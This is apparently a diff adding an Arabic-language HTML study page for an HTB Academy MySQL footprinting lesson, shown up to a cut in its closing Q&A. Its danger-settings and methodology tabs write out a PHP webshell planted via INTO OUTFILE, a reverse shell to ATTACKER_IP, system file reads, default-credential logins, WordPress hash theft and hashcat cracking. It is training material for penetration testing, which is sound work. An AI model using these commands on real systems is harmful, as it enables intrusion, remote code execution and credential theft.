@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MySQL — HTB Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0a0e14;--bg2:#0d1117;--bg3:#161b22;--border:#21262d;--border2:#30363d;--cyan:#00d4ff;--green:#00ff88;--red:#ff4444;--yellow:#ffd700;--purple:#9d4edd;--text:#c9d1d9;--text2:#8b949e;--text3:#6e7681;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Share Tech Mono',monospace;background:var(--bg);color:var(--text);min-height:100vh;direction:rtl;overflow-x:hidden;}
+body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);pointer-events:none;z-index:9999;}
+.back-bar{padding:12px 20px;border-bottom:1px solid var(--border2);}
+.back-btn{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text3);text-decoration:none;letter-spacing:2px;padding:5px 12px;border:1px solid var(--border2);transition:all .2s;}
+.back-btn:hover{color:var(--cyan);border-color:var(--cyan);}
+.header{background:linear-gradient(180deg,#0a0e14 0%,#0d1117 100%);border-bottom:1px solid var(--cyan);padding:24px 20px 20px;position:relative;overflow:hidden;}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--cyan),var(--green),transparent);}
+.header-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px;}
+.header-label{font-size:10px;color:var(--cyan);letter-spacing:3px;text-transform:uppercase;}
+.header-label::before{content:'► ';}
+.header-badges{display:flex;gap:8px;flex-wrap:wrap;}
+.badge{padding:3px 10px;border:1px solid;font-size:10px;letter-spacing:1px;text-transform:uppercase;}
+.badge.cyan{border-color:var(--cyan);color:var(--cyan);}
+.badge.green{border-color:var(--green);color:var(--green);}
+.badge.red{border-color:var(--red);color:var(--red);}
+.badge.yellow{border-color:var(--yellow);color:var(--yellow);}
+.header-title{font-family:'Rajdhani',sans-serif;font-size:36px;font-weight:700;letter-spacing:4px;color:#fff;text-transform:uppercase;}
+.header-title span{color:var(--cyan);}
+.header-sub{font-size:11px;color:var(--text2);letter-spacing:2px;margin-top:4px;}
+.facts-bar{display:flex;gap:0;border:1px solid var(--border2);margin:16px 0 0;flex-wrap:wrap;}
+.fact-item{flex:1;min-width:110px;padding:10px 14px;border-left:1px solid var(--border2);display:flex;flex-direction:column;gap:4px;}
+.fact-item:last-child{border-left:none;}
+.fact-label{font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;}
+.fact-value{font-size:13px;color:var(--cyan);}
+.nav{background:var(--bg2);border-bottom:1px solid var(--border2);padding:0 20px;display:flex;gap:0;overflow-x:auto;scrollbar-width:none;}
+.nav::-webkit-scrollbar{display:none;}
+.nav-btn{background:none;border:none;border-bottom:2px solid transparent;color:var(--text3);padding:14px 18px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:1px;text-transform:uppercase;white-space:nowrap;transition:all .2s;}
+.nav-btn:hover{color:var(--cyan);border-bottom-color:var(--cyan);}
+.nav-btn.active{color:var(--cyan);border-bottom-color:var(--cyan);background:rgba(0,212,255,.05);}
+.content{padding:20px;max-width:1100px;margin:0 auto;}
+.tab-panel{display:none;}
+.tab-panel.active{display:block;}
+.section-header{display:flex;align-items:center;gap:10px;margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border2);}
+.section-header-line{flex:1;height:1px;background:linear-gradient(90deg,var(--cyan),transparent);}
+.section-title{font-size:11px;color:var(--cyan);letter-spacing:3px;text-transform:uppercase;}
+.section-title::before{content:'[ ';}
+.section-title::after{content:' ]';}
+.card{background:var(--bg3);border:1px solid var(--border2);padding:16px;margin-bottom:14px;position:relative;}
+.card::before{content:'';position:absolute;top:0;right:0;width:3px;height:100%;background:var(--cyan);opacity:.4;}
+.card.danger::before{background:var(--red);opacity:.6;}
+.card.success::before{background:var(--green);opacity:.6;}
+.card-title{font-size:12px;color:var(--cyan);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
+.card-title::before{content:'▸ ';color:var(--green);}
+.code-block{background:#010409;border:1px solid var(--border);border-right:3px solid var(--cyan);padding:14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text);direction:ltr;text-align:left;overflow-x:auto;white-space:pre;line-height:1.6;margin:8px 0;}
+.code-block .cmd{color:var(--cyan);}
+.code-block .ok{color:var(--green);}
+.code-block .err{color:var(--red);}
+.code-block .cmt{color:var(--text3);}
+.code-block .val{color:var(--yellow);}
+table{width:100%;border-collapse:collapse;font-size:11px;margin:10px 0;}
+th{background:#010409;color:var(--cyan);padding:8px 12px;text-align:right;border:1px solid var(--border2);letter-spacing:1px;text-transform:uppercase;font-size:10px;}
+td{padding:7px 12px;border:1px solid var(--border);color:var(--text);vertical-align:top;font-size:11px;}
+tr:nth-child(even) td{background:#0d1117;}
+tr:nth-child(odd) td{background:#010409;}
+td.mono{font-family:'Share Tech Mono',monospace;color:var(--cyan);}
+td.danger{color:var(--red);}
+td.safe{color:var(--green);}
+td.warn{color:var(--yellow);}
+.alert{padding:10px 14px;font-size:11px;margin:8px 0;border-right:3px solid;direction:rtl;line-height:1.6;}
+.alert.danger{background:rgba(255,68,68,.08);border-color:var(--red);color:#ff8888;}
+.alert.success{background:rgba(0,255,136,.08);border-color:var(--green);color:#88ffbb;}
+.alert.info{background:rgba(0,212,255,.08);border-color:var(--cyan);color:#88e4ff;}
+.alert.warning{background:rgba(255,215,0,.08);border-color:var(--yellow);color:#ffe566;}
+.tag{display:inline-block;padding:2px 8px;font-size:10px;letter-spacing:1px;text-transform:uppercase;margin:2px;font-family:'Share Tech Mono',monospace;}
+.tag.cyan{background:rgba(0,212,255,.1);border:1px solid var(--cyan);color:var(--cyan);}
+.tag.green{background:rgba(0,255,136,.1);border:1px solid var(--green);color:var(--green);}
+.tag.red{background:rgba(255,68,68,.1);border:1px solid var(--red);color:var(--red);}
+.tag.yellow{background:rgba(255,215,0,.1);border:1px solid var(--yellow);color:var(--yellow);}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0;}
+.info-box{background:#010409;border:1px solid var(--border2);padding:12px;}
+.info-box-title{font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.chain{display:flex;align-items:center;flex-wrap:wrap;margin:12px 0;}
+.chain-step{flex:1;min-width:80px;background:var(--bg3);border:1px solid var(--border2);padding:10px 8px;text-align:center;font-size:10px;}
+.chain-step .step-icon{font-size:18px;margin-bottom:4px;}
+.chain-step .step-name{color:var(--text);font-size:10px;}
+.chain-step .step-sub{color:var(--text3);font-size:9px;margin-top:2px;}
+.chain-step.highlight{border-color:var(--red);background:rgba(255,68,68,.05);}
+.chain-arrow{color:var(--cyan);font-size:14px;padding:0 4px;}
+.method-step{display:flex;gap:14px;padding:12px 0;border-bottom:1px solid var(--border);align-items:flex-start;}
+.method-step:last-child{border-bottom:none;}
+.method-num{background:var(--cyan);color:#000;width:24px;height:24px;min-width:24px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:bold;margin-top:2px;}
+.method-content{flex:1;}
+.method-title{color:var(--cyan);font-size:12px;margin-bottom:4px;}
+.method-desc{color:var(--text2);font-size:11px;line-height:1.6;}
+.convo{margin:10px 0;}
+.convo-q{background:rgba(0,212,255,.05);border:1px solid var(--cyan);padding:10px 14px;margin-bottom:6px;font-size:12px;color:var(--cyan);}
+.convo-q::before{content:'❓ سؤال: ';color:var(--yellow);}
+.convo-a{background:rgba(0,255,136,.05);border:1px solid var(--green);padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text);line-height:1.6;}
+.convo-a::before{content:'✅ الجواب: ';color:var(--green);}
+.label{font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin:10px 0 6px;}
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;margin:12px 0;}
+.tool-btn{background:var(--bg3);border:1px solid var(--border2);padding:12px 8px;text-align:center;cursor:pointer;transition:all .2s;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);}
+.tool-btn:hover{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.05);}
+.tool-btn.active{border-color:var(--green);color:var(--green);background:rgba(0,255,136,.05);}
+.tool-btn .tool-icon{font-size:20px;margin-bottom:6px;display:block;}
+.tool-panel{display:none;}
+.tool-panel.active{display:block;}
+@media(max-width:600px){.grid-2{grid-template-columns:1fr;}.chain{flex-direction:column;}}
+</style>
+</head>
+<body>
+
+<div class="back-bar"><a href="protocols.html" class="back-btn">◄ BACK TO PROTOCOLS</a></div>
+
+<div class="header">
+  <div class="header-top">
+    <div class="header-label">HTB Academy · Module 112 · Section 13/21</div>
+    <div class="header-badges">
+      <span class="badge cyan">Footprinting</span>
+      <span class="badge green">Port 3306</span>
+      <span class="badge red">File Read/Write</span>
+      <span class="badge yellow">LAMP Stack</span>
+    </div>
+  </div>
+  <div class="header-title"><span>MySQL</span> — RELATIONAL DATABASE</div>
+  <div class="header-sub">DATABASE ANALYSIS · SQL COMMANDS · FILE OPERATIONS · CREDENTIAL THEFT</div>
+  <div class="facts-bar">
+    <div class="fact-item"><div class="fact-label">Port</div><div class="fact-value">TCP 3306</div></div>
+    <div class="fact-item"><div class="fact-label">Stack</div><div class="fact-value">LAMP / LEMP</div></div>
+    <div class="fact-item"><div class="fact-label">Config File</div><div class="fact-value">mysqld.cnf</div></div>
+    <div class="fact-item"><div class="fact-label">File Read</div><div class="fact-value" style="color:var(--red);">LOAD_FILE()</div></div>
+    <div class="fact-item"><div class="fact-label">File Write</div><div class="fact-value" style="color:var(--red);">INTO OUTFILE</div></div>
+    <div class="fact-item"><div class="fact-label">Metadata DB</div><div class="fact-value">information_schema</div></div>
+  </div>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showPanel('overview',this)">Overview</button>
+  <button class="nav-btn" onclick="showPanel('config',this)">Config</button>
+  <button class="nav-btn" onclick="showPanel('danger',this)">Danger Settings</button>
+  <button class="nav-btn" onclick="showPanel('commands',this)">SQL Commands</button>
+  <button class="nav-btn" onclick="showPanel('tools',this)">Tools</button>
+  <button class="nav-btn" onclick="showPanel('methodology',this)">Methodology</button>
+  <button class="nav-btn" onclick="showPanel('explained',this)">Explained Q&A</button>
+</div>
+
+<div class="content">
+
+<!-- OVERVIEW -->
+<div id="panel-overview" class="tab-panel active">
+  <div class="section-header"><div class="section-title">نظرة عامة</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">ما هو MySQL؟</div>
+    <p style="color:var(--text);font-size:12px;line-height:1.8;margin-bottom:12px;">قاعدة بيانات علائقية مفتوحة المصدر تديرها Oracle. تخزن البيانات في جداول مترابطة. تخدم آلاف المستخدمين بنفس الوقت بسرعة عالية. أساس معظم المواقع الديناميكية.</p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">🏗️ LAMP Stack</div>
+        <div style="display:flex;flex-direction:column;gap:6px;direction:ltr;margin-top:6px;">
+          <div style="background:rgba(0,255,136,.08);border:1px solid var(--green);padding:6px 10px;font-size:11px;color:var(--green);">L = Linux — نظام التشغيل</div>
+          <div style="background:rgba(0,212,255,.08);border:1px solid var(--cyan);padding:6px 10px;font-size:11px;color:var(--cyan);">A = Apache — Web Server</div>
+          <div style="background:rgba(255,215,0,.08);border:1px solid var(--yellow);padding:6px 10px;font-size:11px;color:var(--yellow);">M = MySQL — Database</div>
+          <div style="background:rgba(157,78,221,.08);border:1px solid var(--purple);padding:6px 10px;font-size:11px;color:var(--purple);">P = PHP — Programming Language</div>
+        </div>
+        <div style="color:var(--text3);font-size:10px;margin-top:8px;">LEMP = نفس الشيء بس Nginx بدل Apache</div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">🔄 كيف يشتغل مع WordPress</div>
+        <div style="direction:ltr;display:flex;flex-direction:column;gap:4px;font-size:10px;margin-top:6px;">
+          <div style="background:#0d1117;border:1px solid var(--border2);padding:5px 8px;color:var(--text2);">المستخدم يفتح الموقع</div>
+          <div style="text-align:center;color:var(--text3);">↓</div>
+          <div style="background:#0d1117;border:1px solid var(--border2);padding:5px 8px;color:var(--text2);">Apache يستقبل الطلب</div>
+          <div style="text-align:center;color:var(--text3);">↓</div>
+          <div style="background:#0d1117;border:1px solid var(--border2);padding:5px 8px;color:var(--text2);">PHP يسأل MySQL عن البيانات</div>
+          <div style="text-align:center;color:var(--text3);">↓</div>
+          <div style="background:rgba(0,255,136,.08);border:1px solid var(--green);padding:5px 8px;color:var(--green);">MySQL يرجع البيانات ✅</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">💰 ما تحتويه قاعدة البيانات</div>
+    <div class="grid-2">
+      <div style="background:#010409;border:1px solid var(--red);padding:12px;">
+        <div style="color:var(--red);font-size:11px;margin-bottom:8px;">🎯 بيانات حساسة</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.8;">
+          passwords (hashed أو plain text!)<br>
+          emails + usernames<br>
+          credit card numbers<br>
+          API keys + tokens<br>
+          session tokens
+        </div>
+      </div>
+      <div style="background:#010409;border:1px solid var(--border2);padding:12px;">
+        <div style="color:var(--cyan);font-size:11px;margin-bottom:8px;">📋 بيانات الموقع</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.8;">
+          مقالات + تعليقات<br>
+          إعدادات الموقع<br>
+          صلاحيات المستخدمين<br>
+          templates + themes<br>
+          plugins settings
+        </div>
+      </div>
+    </div>
+    <div class="alert danger">💀 passwords ممكن تكون plain text! المطورون الكسلانون ما يشفرونها.</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔗 MariaDB</div>
+    <p style="color:var(--text2);font-size:12px;line-height:1.8;">MariaDB = fork من MySQL. المطور الأصلي لـ MySQL خرج من الشركة بعد استحواذ Oracle وطور MariaDB. كلاهما متوافق تقريباً — نفس الأوامر تشتغل على الاثنين.</p>
+    <div class="alert info">💡 لو شفت MariaDB في الـ scan — نفس أوامر MySQL تشتغل 🎯</div>
+  </div>
+</div>
+
+<!-- CONFIG -->
+<div id="panel-config" class="tab-panel">
+  <div class="section-header"><div class="section-title">الإعدادات</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">ملف الإعداد الافتراضي</div>
+    <div class="code-block"><span class="cmd">cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'</span>
+
+[mysqld]
+user = mysql
+port = <span class="val">3306</span>
+basedir = /usr
+datadir = /var/lib/mysql
+socket = /var/run/mysqld/mysqld.sock
+pid-file = /var/run/mysqld/mysqld.pid
+skip-host-cache
+skip-name-resolve</div>
+    <div class="alert info">💡 datadir = /var/lib/mysql — هنا تُخزن قواعد البيانات على الـ disk</div>
+  </div>
+</div>
+
+<!-- DANGER -->
+<div id="panel-danger" class="tab-panel">
+  <div class="section-header"><div class="section-title">Dangerous Settings</div><div class="section-header-line"></div></div>
+
+  <div class="card danger">
+    <div class="card-title">⚠️ الإعدادات الخطيرة</div>
+    <table>
+      <tr><th>الإعداد</th><th>الخطر</th></tr>
+      <tr><td class="mono">user = root</td><td class="danger">MySQL يشتغل كـ root = صلاحيات كاملة على النظام!</td></tr>
+      <tr><td class="mono">password = P@ss (plain text)</td><td class="danger">باسورد في الـ config بدون تشفير</td></tr>
+      <tr><td class="mono">admin_address = 0.0.0.0</td><td class="danger">MySQL مكشوف من أي IP!</td></tr>
+      <tr><td class="mono">debug = ON</td><td class="danger">أخطاء SQL تظهر للمستخدم = كشف بنية البيانات</td></tr>
+      <tr><td class="mono">sql_warnings = ON</td><td class="warn">تحذيرات تكشف معلومات حساسة</td></tr>
+      <tr><td class="mono">secure_file_priv = ""</td><td class="danger">قراءة/كتابة أي ملف على السيرفر! 💀</td></tr>
+    </table>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">💀 debug = ON — كيف يستغله المهاجم</div>
+    <div class="grid-2">
+      <div style="background:#010409;border:1px solid var(--green);padding:12px;">
+        <div style="color:var(--green);font-size:11px;margin-bottom:8px;">بدون debug:</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.6;">المستخدم يدخل SQL injection<br>→ "An error occurred. Please try again."<br>← المهاجم ما يعرف إيش صار ❌</div>
+      </div>
+      <div style="background:#010409;border:1px solid var(--red);padding:12px;">
+        <div style="color:var(--red);font-size:11px;margin-bottom:8px;">مع debug = ON:</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.6;">نفس الـ input<br>→ "ERROR 1064: near 'admin' OR '1'='1'<br>Query: SELECT * FROM <span style="color:var(--red);">users</span> WHERE username=..."<br>← يكشف: اسم الجدول، الـ columns، كيف تكتب الـ query 🎯</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">💀 secure_file_priv = "" — قراءة وكتابة الملفات</div>
+    <div class="label">هجوم 1 — قراءة ملفات النظام:</div>
+    <div class="code-block"><span class="cmd">SELECT LOAD_FILE('/etc/passwd');</span>
+
+<span class="ok">root:x:0:0:root:/root:/bin/bash</span>
+<span class="ok">mysql:x:111:114::/var/lib/mysql:/bin/false</span>
+<span class="val">admin:x:1001:1001::/home/admin:/bin/bash</span>  <span class="cmt">← usernames!</span></div>
+    <div class="label">هجوم 2 — كتابة Webshell:</div>
+    <div class="code-block"><span class="cmd">SELECT "&lt;?php system($_GET['cmd']); ?&gt;"
+INTO OUTFILE '/var/www/html/shell.php';</span>
+
+<span class="cmt"># بعدها:</span>
+http://TARGET/shell.php?cmd=whoami
+<span class="ok">www-data</span>
+
+http://TARGET/shell.php?cmd=bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
+<span class="err">← Reverse Shell! 💥</span></div>
+    <div class="alert danger">💀 debug + secure_file_priv = "" → SQL Injection + File Write = RCE كامل!</div>
+  </div>
+</div>
+
+<!-- SQL COMMANDS -->
+<div id="panel-commands" class="tab-panel">
+  <div class="section-header"><div class="section-title">SQL Commands</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">🔌 الاتصال بـ MySQL</div>
+    <div class="code-block"><span class="cmt"># اتصال عادي:</span>
+<span class="cmd">mysql -u root -pP4SSw0rd -h 10.129.14.128</span>
+
+<span class="cmt"># بدون باسورد (تحقق):</span>
+<span class="cmd">mysql -u root -h 10.129.14.128</span>
+<span class="err">ERROR 1045: Access denied (using password: NO)</span>  <span class="cmt">← عنده باسورد</span>
+
+<span class="ok">Welcome to the MariaDB monitor.</span>
+<span class="ok">MySQL [(none)]&gt;</span></div>
+    <div class="alert warning">⚠️ ما في مسافة بين -p والباسورد! -pP4SSw0rd صح، -p P4SSw0rd غلط</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📋 الأوامر الأساسية</div>
+    <table>
+      <tr><th>الأمر</th><th>الوظيفة</th></tr>
+      <tr><td class="mono">show databases;</td><td>عرض كل قواعد البيانات</td></tr>
+      <tr><td class="mono">use wordpress;</td><td>اختيار قاعدة بيانات</td></tr>
+      <tr><td class="mono">show tables;</td><td>عرض كل الجداول</td></tr>
+      <tr><td class="mono">show columns from wp_users;</td><td>عرض أعمدة جدول معين</td></tr>
+      <tr><td class="mono">select * from wp_users;</td><td>عرض كل البيانات</td></tr>
+      <tr><td class="mono">select user_login, user_pass from wp_users;</td><td>عرض أعمدة محددة</td></tr>
+      <tr><td class="mono">select * from wp_users where user_login = "admin";</td><td>بحث عن قيمة</td></tr>
+      <tr><td class="mono">select version();</td><td>إصدار MySQL</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🗄️ information_schema — كنز المعلومات</div>
+    <p style="color:var(--text2);font-size:12px;margin-bottom:10px;">قاعدة بيانات خاصة تحتوي metadata عن كل قواعد البيانات الأخرى:</p>
+    <div class="code-block"><span class="cmt"># شوف كل الجداول في WordPress:</span>
+<span class="cmd">SELECT table_name FROM information_schema.tables
+WHERE table_schema = 'wordpress';</span>
+
+<span class="ok">wp_users</span>     <span class="cmt">← 🎯 الأهم</span>
+wp_posts
+wp_options
+wp_usermeta
+
+<span class="cmt"># شوف كل databases:</span>
+<span class="cmd">SELECT schema_name FROM information_schema.schemata;</span>
+
+<span class="cmt"># صلاحيات المستخدمين:</span>
+<span class="cmd">SELECT * FROM information_schema.user_privileges;</span></div>
+    <div class="alert info">💡 information_schema = خريطة كاملة لكل قواعد البيانات على السيرفر!</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">💥 مثال كامل — سرقة WordPress credentials</div>
+    <div class="code-block"><span class="cmd">mysql -u root -pP4SSw0rd -h 10.129.14.128</span>
+
+<span class="cmd">show databases;</span>
+| wordpress          |  <span class="cmt">← هدفنا</span>
+
+<span class="cmd">use wordpress;</span>
+<span class="cmd">show tables;</span>
+| wp_users           |  <span class="cmt">← 🎯</span>
+
+<span class="cmd">show columns from wp_users;</span>
+| ID          |
+| user_login  |  <span class="cmt">← username</span>
+| user_pass   |  <span class="cmt">← password hash</span>
+| user_email  |
+
+<span class="cmd">select user_login, user_pass from wp_users;</span>
+| admin | <span class="val">$P$B7eFMNDNmjEHMUGpMnRbKSdI2JuMl0.</span> |
+| john  | <span class="val">$P$BZlxAMnC6ON.PYTjb2bFMprMu/CLGT1</span> |
+
+<span class="cmt"># كسر الـ hash:</span>
+<span class="cmd">hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="ok">$P$B7eFMN...:P@ssw0rd123</span>  <span class="cmt">← كُسر! 🎯</span></div>
+  </div>
+</div>
+
+<!-- TOOLS -->
+<div id="panel-tools" class="tab-panel">
+  <div class="section-header"><div class="section-title">الأدوات</div><div class="section-header-line"></div></div>
+
+  <div class="label">اختر الأداة:</div>
+  <div class="tool-grid">
+    <div class="tool-btn active" onclick="showTool('nmap',this)"><span class="tool-icon">🔍</span>Nmap</div>
+    <div class="tool-btn" onclick="showTool('mysql',this)"><span class="tool-icon">🗄️</span>mysql client</div>
+    <div class="tool-btn" onclick="showTool('hashcat',this)"><span class="tool-icon">🔓</span>hashcat</div>
+  </div>
+
+  <!-- NMAP -->
+  <div id="tool-nmap" class="tool-panel active">
+    <div class="card"><div class="card-title">🔍 Nmap على MySQL</div>
+    <div class="code-block"><span class="cmd">sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*</span>
+
+PORT     STATE SERVICE VERSION
+<span class="ok">3306/tcp open  mysql   MySQL 8.0.27</span>
+| mysql-empty-password:
+|_ <span class="err">root account has empty password</span>  <span class="cmt">← ممكن false positive!</span>
+| mysql-enum:
+|   Valid usernames:
+|   <span class="val">root, admin, web, user, test</span>
+| mysql-info:
+|   Version: 8.0.27-0ubuntu0.20.04.1
+|   Auth Plugin: caching_sha2_password</div>
+    <div class="alert warning">⚠️ دايماً تحقق يدوياً! Nmap ممكن يعطي false positives على MySQL</div>
+    <div class="label">التحقق اليدوي:</div>
+    <div class="code-block"><span class="cmd">mysql -u root -h 10.129.14.128</span>
+<span class="err">ERROR 1045: Access denied</span>  <span class="cmt">← false positive! عنده باسورد فعلاً</span>
+
+<span class="cmd">mysql -u root -pP4SSw0rd -h 10.129.14.128</span>
+<span class="ok">Welcome to MySQL!</span>  <span class="cmt">← صح ✅</span></div>
+    </div>
+  </div>
+
+  <!-- MYSQL CLIENT -->
+  <div id="tool-mysql" class="tool-panel">
+    <div class="card"><div class="card-title">🗄️ mysql client — الاتصال المباشر</div>
+    <div class="code-block"><span class="cmt"># الاتصال:</span>
+<span class="cmd">mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;IP&gt;</span>
+
+<span class="cmt"># أمثلة:</span>
+<span class="cmd">mysql -u root -h 10.129.14.128</span>            <span class="cmt"># بدون باسورد</span>
+<span class="cmd">mysql -u root -pP4SSw0rd -h 10.129.14.128</span> <span class="cmt"># مع باسورد</span>
+<span class="cmd">mysql -u admin -p -h 10.129.14.128</span>        <span class="cmt"># يسأل عن الباسورد تفاعلياً</span></div>
+    <div class="alert info">💡 -p بدون مسافة قبل الباسورد — هاد مهم!</div>
+    </div>
+  </div>
+
+  <!-- HASHCAT -->
+  <div id="tool-hashcat" class="tool-panel">
+    <div class="card"><div class="card-title">🔓 hashcat — كسر الـ Hashes</div>
+    <div class="code-block"><span class="cmt"># WordPress MD5 hash (mode 400):</span>
+<span class="cmd">hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt</span>
+
+<span class="cmt"># MySQL hash (mode 300):</span>
+<span class="cmd">hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt</span>
+
+<span class="cmt"># SHA-256 (mode 1400):</span>
+<span class="cmd">hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt</span></div>
+    <div class="alert info">
+      💡 تعرف نوع الـ hash:<br>
+      $P$B... = WordPress MD5 → mode 400<br>
+      *4ACFE3202A5FF5CF467898FC58AAB1D615029441 = MySQL → mode 300<br>
+      $2y$... = bcrypt → mode 3200
+    </div>
+    </div>
+  </div>
+</div>
+
+<!-- METHODOLOGY -->
+<div id="panel-methodology" class="tab-panel">
+  <div class="section-header"><div class="section-title">Methodology</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">⛓️ خطوات الـ MySQL Footprinting</div>
+    <div class="method-step">
+      <div class="method-num">1</div>
+      <div class="method-content">
+        <div class="method-title">Nmap Scan</div>
+        <div class="method-desc">اكتشاف MySQL + إصدار + usernames محتملة</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">sudo nmap -sV -sC -p3306 --script mysql* TARGET</span></div>
+        <div class="alert warning" style="margin-top:6px;">⚠️ تحقق يدوياً من نتائج Nmap — false positives شائعة!</div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">2</div>
+      <div class="method-content">
+        <div class="method-title">محاولة الاتصال</div>
+        <div class="method-desc">جرب credentials شائعة أو اللي حصلت عليها</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">mysql -u root -h TARGET          # بدون باسورد
+mysql -u root -proot -h TARGET   # root:root
+mysql -u root -p -h TARGET       # تفاعلي</span></div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">3</div>
+      <div class="method-content">
+        <div class="method-title">Enumerate Databases</div>
+        <div class="method-desc">شوف كل قواعد البيانات وحدد الهدف</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">show databases;
+use wordpress;  ← أو أي database مهم
+show tables;</span></div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">4</div>
+      <div class="method-content">
+        <div class="method-title">سرقة Credentials</div>
+        <div class="method-desc">استخرج usernames وpasswords</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">show columns from wp_users;
+select user_login, user_pass from wp_users;</span></div>
+        <div class="alert danger" style="margin-top:6px;">🎯 ابحث عن: wp_users, users, accounts, admins</div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">5</div>
+      <div class="method-content">
+        <div class="method-title">تحقق من File Operations</div>
+        <div class="method-desc">لو secure_file_priv = "" → اقرأ /etc/passwd أو اكتب webshell</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">SELECT LOAD_FILE('/etc/passwd');
+SELECT "<?php system($_GET['cmd']); ?>"
+INTO OUTFILE '/var/www/html/shell.php';</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⛓️ Attack Chain</div>
+    <div class="chain">
+      <div class="chain-step"><div class="step-icon">🔍</div><div class="step-name">Nmap</div><div class="step-sub">Port 3306</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔌</div><div class="step-name">Connect</div><div class="step-sub">mysql client</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🗄️</div><div class="step-name">Enumerate</div><div class="step-sub">databases/tables</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔑</div><div class="step-name">Steal Hashes</div><div class="step-sub">wp_users</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step highlight"><div class="step-icon">💥</div><div class="step-name">RCE</div><div class="step-sub">webshell</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- EXPLAINED Q&A -->
+<div id="panel-explained" class="tab-panel">
+  <div class="section-header"><div class="section-title">Explained — Q&A</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">🌐 الأساسيات</div>
+    <div class="convo">
+      <div class="convo-q">إيش الفرق بين MySQL وExcel؟</div>
+      <div class="convo-a">Excel = ملف واحد على جهازك، شخص واحد، بطيء. MySQL = سيرفر يخدم آلاف المستخدمين بنفس الوقت، ملايين السجلات بسرعة، SQL queries قوية، علاقات بين الجداول.</div>
+    </div>
+    <div class="convo">
+      <div class="convo-q">ليش information_schema مهم في الـ pentest؟</div>
+      <div class="convo-a">لأنه يحتوي metadata عن كل قواعد البيانات — أسماء كل الجداول والأعمدة وصلاحيات المستخدمين. بدل ما تخمن، تسأل information_schema "وين الـ users table؟" وهو يخبرك مباشرة.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⚠️ Dangerous Settings</div>
+    <div class="convo">
+      <div class="convo-q">ليش secure_file_priv = "" أخطر إعداد؟</div>
